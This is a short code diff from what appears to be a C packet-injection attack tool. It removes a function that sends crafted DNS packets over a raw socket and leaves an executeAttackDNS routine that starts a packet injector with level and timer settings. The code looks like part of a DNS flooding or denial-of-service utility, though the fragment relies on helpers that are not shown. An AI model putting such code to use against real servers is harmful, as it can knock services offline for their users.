@@ -14,24 +14,6 @@
 #define GetPort( port ) ( port > 0 ) ? port : DNS_DEFAULT_PORT
 #define UDPPacketSize( payload_size ) ( IP_HEADER_SIZE + UDP_HEADER_SIZE + payload_size )
 
-void dnsSetValue( AttackPlan * p_atkData )
-{
-    int sock = CreateSocket(RAW, NO_BLOCK);
-    DNSheader response;
-    
-    ConnectTCP(sock, p_atkData->setPacket);
-    for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
-    {
-        if( SendPacket(sock, tmpPkt) < 0 )
-        {
-            Efatal(ERROR_DNS, "error DNS\n");
-        }
-
-        recv(sock, &response, sizeof( DNSheader ) + strlen((const char*)strDomain) + 1 + sizeof(QUESTION), 0);
-    }
-    CloseSocket(sock);
-}
-
 static AttackPlan * createAttackDNS( LhfDraft *p_draft )
 {
     AttackPlan *newData;
@@ -48,11 +30,6 @@ static AttackPlan * createAttackDNS( LhfDraft *p_draft )
 void executeAttackDNS( AttackPlan * atkData )
 {
     char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
-    
-    if(atkData->draft->type == DNS)
-    {
-        dnsSetValue( atkData );
-    }
     StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
 }
 
